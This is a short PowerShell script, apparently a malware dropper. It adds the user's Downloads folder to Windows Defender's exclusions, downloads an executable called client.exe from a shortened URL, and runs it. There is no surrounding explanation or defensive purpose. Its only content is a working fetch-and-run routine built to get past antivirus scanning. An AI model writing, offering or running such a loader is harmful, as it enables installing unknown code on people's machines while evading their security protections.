Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
$url = 'https://shorturl.at/lqqTF'
$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'client.exe')

# Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
Start-Sleep -Milliseconds 100 

# Download the file
Invoke-WebRequest -Uri $url -OutFile $outputFile

# Run the downloaded file after the download is complete
Start-Process -FilePath $outputFile
